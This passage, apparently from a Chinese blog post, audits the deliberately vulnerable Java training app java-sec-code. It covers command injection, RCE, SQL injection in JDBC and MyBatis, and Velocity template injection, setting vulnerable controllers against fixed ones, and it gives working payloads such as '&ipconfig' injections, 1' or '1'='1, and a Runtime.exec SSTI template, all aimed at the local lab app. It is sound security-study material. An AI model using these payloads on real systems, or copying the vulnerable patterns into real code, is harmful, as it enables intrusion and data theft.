class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>    &#125;<br></code></pre></td></tr></table></figure><p>filepath并未做任何的过滤，直接拼接</p><p>在windows中<strong>使用&amp;符号拼接cmd命令</strong></p><p>由于是web服务应用，<strong>使用&amp;符号拼接url命令</strong></p></li><li><p>payload</p><p>localhost:9000&#x2F;codeinject?filepath&#x3D;.%26ipconfig</p><p>（页面返回主机配置）</p></li></ul></li><li><ul><li><p>&#x2F;codeinject&#x2F;host</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/host&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectHost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;host&quot;</span>);<br>        logger.info(host);<br>        <span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;cmd&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir  &quot;</span> + host&#125;;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>    &#125;<br></code></pre></td></tr></table></figure><p>http的请求头host（无过滤）</p></li><li><p>payload</p><p>抓包之后，在数据包中修改   <code>host：localhost&amp;ipconfig</code></p><p>(返回包显示主机信息)</p></li></ul></li><li><ul><li><p>codeinject&#x2F;sec（不行）</p><p>原因：（存在过滤）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-meta">@GetMapping(&quot;/codeinject/sec&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectSec</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterFilePath</span> <span class="hljs-operator">=</span> SecurityUtil.cmdFilter(filepath);  <span class="hljs-comment">//过滤</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == filterFilePath) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad boy. I got u.&quot;</span>;<br>        &#125;<br>        <span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;cmd&quot;, &quot;-c&quot;, &quot;dir -la &quot; + filterFilePath&#125;;</span><br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir  &quot;</span> + filterFilePath&#125;;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>追踪<code>cmdFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title function_">cmdFilter</span><span class="hljs-params">(string input)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!FILTER PATTERN.matcher(input).matches())&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><span class="hljs-keyword">return</span> input;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>查看FILTER PATTERN（常量）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Pattern <span class="hljs-type">FILTER</span> <span class="hljs-variable">PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^[a-zA-Z0-9 /\\.-]+$&quot;</span>);<br></code></pre></td></tr></table></figure><p>FILTER PATTERN过滤（大小写，特殊字符）</p><p>出现命令注入时，有特殊字符返回null</p></li><li><p>所以不行</p></li></ul></li></ol><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>\src\main\java\org\joychou\controller\Rce.java</p><p>（已经展示了命令执行过程）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/rce&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rce</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/runtime/exec&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">CommandExec</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//直接执行，无过滤</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> run.exec(cmd);<br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>            String tmpStr;<br><br>            <span class="hljs-keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                sb.append(tmpStr);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (p.waitFor() != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (p.exitValue() == <span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Command exec failed!!&quot;</span>;<br>            &#125;<br><br>            inBr.close();<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>Runtime.getRuntime().exec()，ProcessBuilder、通过yaml加载恶意Java对象进行命令执行，通过groovyShell进行命令执行</p><p>执行之后执行结果推送回前端显示</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>\src\main\java\org\joychou\controller\SQLI.java</p><p>定义的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc_sqli_vul（漏洞方法）<br>jdbc_sqli_sec（安全方法）<br>jdbc_ps_vuln<br>mybatisVuln01（漏洞方法）<br>mybatisVuln02（漏洞方法）<br>mybatisVuln03（漏洞方法）<br>mybatisSec01（安全方法）<br>mybatisSec02（安全方法）<br>mybatisSec03（安全方法）<br>mybatisOrderBySec04（安全方法）<br></code></pre></td></tr></table></figure><h3 id="jdbc-sqli-vul"><a href="#jdbc-sqli-vul" class="headerlink" title="jdbc_sqli_vul"></a>jdbc_sqli_vul</h3><ol><li><pre><code class="java">/**     * &lt;p&gt;Sql injection jbdc vuln code.&lt;/p&gt;&lt;br&gt;     *     * &lt;a href=&quot;http://localhost:8080/sqli/jdbc/vuln?username=joychou&quot;&gt;http://localhost:8080/sqli/jdbc/vuln?username=joychou&lt;/a&gt;     */    @RequestMapping(&quot;/jdbc/vuln&quot;)    public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;        StringBuilder result = new StringBuilder();        try &#123;            Class.forName(driver);            Connection con = DriverManager.getConnection(url, user, password);            if (!con.isClosed())                System.out.println(&quot;Connect to database successfully.&quot;);            // sqli vuln code            Statement statement = con.createStatement();            String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;    //直接拼接語句存在sql漏洞            logger.info(sql);            ResultSet rs = statement.executeQuery(sql);            while (rs.next()) &#123;                String res_name = rs.getString(&quot;username&quot;);                String res_pwd = rs.getString(&quot;password&quot;);                String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);                result.append(info);                logger.info(info);            &#125;            rs.close();            con.close();        &#125; catch (ClassNotFoundException e) &#123;            logger.error(&quot;Sorry, can&#39;t find the Driver!&quot;);        &#125; catch (SQLException e) &#123;            logger.error(e.toString());        &#125;        return result.toString();    &#125;<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>   直接拼接語句存在<span class="hljs-keyword">sql</span>漏洞（对于参数username进行带入数据库查询）<br><br><span class="hljs-number">2.</span> payload<br><br>   username=<span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>   url编码：username=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span><span class="hljs-keyword">or</span>%<span class="hljs-number">20</span>%<span class="hljs-number">271</span>%<span class="hljs-number">27</span>=%<span class="hljs-number">271</span><br><br>   最终的payload：sqli/jdbc/vuln?username=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span><span class="hljs-keyword">or</span>%<span class="hljs-number">20</span>%<span class="hljs-number">271</span>%<span class="hljs-number">27</span>=%<span class="hljs-number">271</span><br><br>### jdbc_sqli_sec<br><br><span class="hljs-number">1.</span> ```java<br>       <span class="hljs-comment">/**</span><br><span class="hljs-comment">        * &lt;p&gt;Sql injection jbdc security code by using &#123;@link PreparedStatement&#125;.&lt;/p&gt;&lt;br&gt;</span><br><span class="hljs-comment">        *</span><br><span class="hljs-comment">        * &lt;a href=&quot;http://localhost:8080/sqli/jdbc/sec?username=joychou&quot;&gt;http://localhost:8080/sqli/jdbc/sec?username=joychou&lt;/a&gt;</span><br><span class="hljs-comment">        */</span><br>       @RequestMapping(&quot;/jdbc/sec&quot;)<br>       <span class="hljs-built_in">public</span> String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;<br>   <br>           StringBuilder result = <span class="hljs-built_in">new</span> StringBuilder();<br>           try &#123;<br>               <span class="hljs-keyword">Class</span>.forName(driver);<br>               <span class="hljs-keyword">Connection</span> con = DriverManager.getConnection(url, <span class="hljs-keyword">user</span>, <span class="hljs-keyword">password</span>);<br>   <br>               <span class="hljs-keyword">if</span> (!con.isClosed())<br>                   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Connect to database successfully.&quot;);<br>   <br>               // fix code<br>               String <span class="hljs-keyword">sql</span> = &quot;select * from users where username = ?&quot;;<br>               <br>               PreparedStatement st = con.prepareStatement(<span class="hljs-keyword">sql</span>);//使用了PreparedStatement接口来访问数据库   <br>               <br>               st.setString(<span class="hljs-number">1</span>, username);<br>   <br>               logger.<span class="hljs-keyword">info</span>(st.toString());  // <span class="hljs-keyword">sql</span> <span class="hljs-keyword">after</span> <span class="hljs-keyword">prepare</span> <span class="hljs-keyword">statement</span><br>               ResultSet rs = st.executeQuery();<br>   <br>               <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>                   String res_name = rs.getString(&quot;username&quot;);<br>                   String res_pwd = rs.getString(&quot;password&quot;);<br>                   String <span class="hljs-keyword">info</span> = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);<br>                   result.append(<span class="hljs-keyword">info</span>);<br>                   logger.<span class="hljs-keyword">info</span>(<span class="hljs-keyword">info</span>);<br>               &#125;<br>   <br>               rs.<span class="hljs-keyword">close</span>();<br>               con.<span class="hljs-keyword">close</span>();<br>   <br>           &#125; catch (ClassNotFoundException e) &#123;<br>               logger.error(&quot;Sorry, can&#x27;t find the Driver!&quot;);<br>               e.printStackTrace();<br>           &#125; catch (SQLException e) &#123;<br>               logger.error(e.toString());<br>           &#125;<br>           <span class="hljs-keyword">return</span> result.toString();<br>       &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql);<span class="hljs-comment">//使用了PreparedStatement接口来访问数据库</span><br></code></pre></td></tr></table></figure>- `PreparedStatement` 接口是 Java 中用于执行预编译 SQL 语句的关键接口，它继承自 `Statement` 接口，主要用于执行参数化 SQL 语句。使用 `PreparedStatement` 可以有效防止 SQL 注入攻击，并且在执行多次相同结构的 SQL 语句时能提高性能。  **防护sql：**  1. 使用预编译：使用？（占位符）传递参数，数据库自动处理参数转义     解释：对于php使用？传入的未限制是数字还是字符；但是java中使用？传入限制只能是数字，如果不是数字，那么会加以过滤（转义/加入特殊字符）     eg：     | **用户输入**           | **字符串拼接结果**                             | **预编译处理结果**                           |     | ---------------------- | ---------------------------------------------- | -------------------------------------------- |     | `1`                    | `WHERE id = &#39;1&#39;`                               | `WHERE id = 1`                               |     | `1 OR 1=1`             | `WHERE id = &#39;1 OR 1=1&#39;`（逻辑被篡改）          | `WHERE id = &#39;1 OR 1=1&#39;`（纯字符串）          |     | `1&#39;; DROP TABLE users` | `WHERE id = &#39;1&#39;; DROP TABLE users`（表被删除） | `WHERE id = &#39;1\&#39;; DROP TABLE users&#39;`（安全） |  2. 存在对于特殊字符的转义  3. 禁用动态 SQL 拼接：避免在代码中手动拼接 SQL，尤其是包含用户输入的部分。若必须使用动态 SQL，需严格验证输入。</code></pre></li><li><p>所以java中：<br>不只order by，凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等”，（在有些SQL语句中还是会必然使用到拼接的方式）</p><p>所以不可注入</p></li></ol><h3 id="jdbc-ps-vuln"><a href="#jdbc-ps-vuln" class="headerlink" title="jdbc_ps_vuln"></a>jdbc_ps_vuln</h3><p>也是使用预处理（同上）</p><h3 id="mybatisVuln01-02-03"><a href="#mybatisVuln01-02-03" class="headerlink" title="mybatisVuln01   02   03"></a>mybatisVuln01   02   03</h3><p>\src\main\java\org\joychou\controller\SQLI.java</p><ol><li><pre><code class="java"> @GetMapping(&quot;/mybatis/sec01&quot;)    public User mybatisSec01(@RequestParam(&quot;username&quot;) String username) &#123;        return userMapper.findByUserName(username);    &#125; @GetMapping(&quot;/mybatis/sec02&quot;)    public User mybatisSec02(@RequestParam(&quot;id&quot;) Integer id) &#123;        return userMapper.findById(id);    &#125;  @GetMapping(&quot;/mybatis/sec03&quot;)    public User mybatisSec03() &#123;        return userMapper.OrderByUsername();    &#125;<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-number">2.</span> 查看map类 <br><br>   \src\main\resources\mapper\UserMapper.xml<br><br>   **<span class="hljs-number">02</span>**<br><br>   ```<span class="hljs-type">xml</span><br>    &lt;<span class="hljs-keyword">select</span> id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;<br>           <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%$&#123;_parameter&#125;%&#x27;</span><br>       &lt;/<span class="hljs-keyword">select</span>&gt;<br>   <br>   #使用<span class="hljs-keyword">like</span>进行拼接<span class="hljs-keyword">sql</span>语句$&#123;_parameter&#125;是 MyBatis 的字符串替换，会直接将参数内容拼接到 <span class="hljs-keyword">SQL</span> 中<br></code></pre></td></tr></table></figure>解决：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameSafe&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users where username like concat(&#x27;%&#x27;,#&#123;_parameter&#125;,&#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>#使用concat(&#x27;%&#x27;,#&#123;_parameter&#125;,&#x27;%&#x27;)的方式进行查询<br></code></pre></td></tr></table></figure>**03**<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>        select * from users<br>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>            order by $&#123;order&#125; asc<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>#$&#123;&#125;使用的是拼接的方式导致的漏洞产生<br></code></pre></td></tr></table></figure>解决：如果是order by后的占位，则最好根据情况通过`if-elseif-else`来分情况实现。`mybatisOrderBySec04`<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">   <br></code></pre></td></tr></table></figure>**01**\target\classes\org\joychou\mapper\UserMapper.class<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-meta">@Select(&#123;&quot;select * from users where username = #&#123;username&#125;&quot;&#125;)</span><br>    User <span class="hljs-title function_">findByUserName</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String var1)</span>;<br><br>    <span class="hljs-meta">@Select(&#123;&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;&#125;)</span><br>    List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln01</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String var1)</span>;<br><br>#$&#123;&#125;使用的是拼接的方式导致的漏洞产生<br></code></pre></td></tr></table></figure>解决：正确的使用方法应该是使用`#`号来进行占位</code></pre></li></ol><h3 id="mybatisOrderBySec04"><a href="#mybatisOrderBySec04" class="headerlink" title="mybatisOrderBySec04"></a>mybatisOrderBySec04</h3><ol><li><pre><code class="java">@GetMapping(&quot;/mybatis/orderby/sec04&quot;)public List&lt;User&gt; mybatisOrderBySec04(@RequestParam(&quot;sort&quot;) String sort) &#123;    return userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));//存在过滤函数&#125;<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs wren"><br><span class="hljs-number">2.</span> 追溯<span class="hljs-variable">sqlFilter</span><br><br>   \<span class="hljs-variable">src</span>\<span class="hljs-variable">main</span>\<span class="hljs-variable">java</span>\<span class="hljs-variable">org</span>\<span class="hljs-variable">joychou</span>\<span class="hljs-variable">security</span>\<span class="hljs-title class_">SecurityUtil</span>.<span class="hljs-property">java</span><br><br>   ```<span class="hljs-variable">java</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">        * 过滤mybatis中order by不能用#的情况。</span><br><span class="hljs-comment">        * 严格限制用户输入只能包含&lt;code&gt;a-zA-Z0-9_-.&lt;/code&gt;字符。</span><br><span class="hljs-comment">        *</span><br><span class="hljs-comment">        * <span class="hljs-doctag">@param</span> sql sql</span><br><span class="hljs-comment">        * <span class="hljs-doctag">@return</span> 安全sql，否则返回null</span><br><span class="hljs-comment">        */</span><br>       <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sqlFilter</span>(<span class="hljs-params">String</span> <span class="hljs-params">sql</span>) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-operator">!</span><span class="hljs-variable">FILTER_PATTERN</span>.<span class="hljs-property">matcher</span>(<span class="hljs-variable">sql</span>).<span class="hljs-property">matches</span>()) &#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>           &#125;<br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">sql</span>;<br>       &#125;<br></code></pre></td></tr></table></figure>FILTER_PATTERN：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">FILTER_PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);<br></code></pre></td></tr></table></figure></code></pre></li><li><p>过滤mybatis中order by不能用#的情况。<br> 严格限制用户输入只能包含<code>a-zA-Z0-9_-.</code>字符</p><p>@param sql sql<br>@return 安全sql，否则返回null</p></li></ol><h2 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h2><p>\src\main\java\org\joychou\controller\SSTI.java</p><p>主要是使用<strong>Velocity组件</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ssti&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SSTI</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * SSTI of Java velocity. The latest Velocity version still has this problem.</span><br><span class="hljs-comment">     * Fix method: Avoid to use Velocity.evaluate method.</span><br><span class="hljs-comment">     * &lt;p&gt;</span><br><span class="hljs-comment">     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span><br><span class="hljs-comment">     * Open a calculator in MacOS.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> template exp</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/velocity&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">velocity</span><span class="hljs-params">(String template)</span> &#123;<br>        Velocity.init();<br><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br><br>        context.put(<span class="hljs-string">&quot;author&quot;</span>, <span class="hljs-string">&quot;Elliot A.&quot;</span>);<br>        context.put(<span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;217 E Broadway&quot;</span>);<br>        context.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;555-1337&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">swOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        Velocity.evaluate(context, swOut, <span class="hljs-string">&quot;test&quot;</span>, template);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是Velocity组件模板·存在漏洞</p><p>参考文章：<a 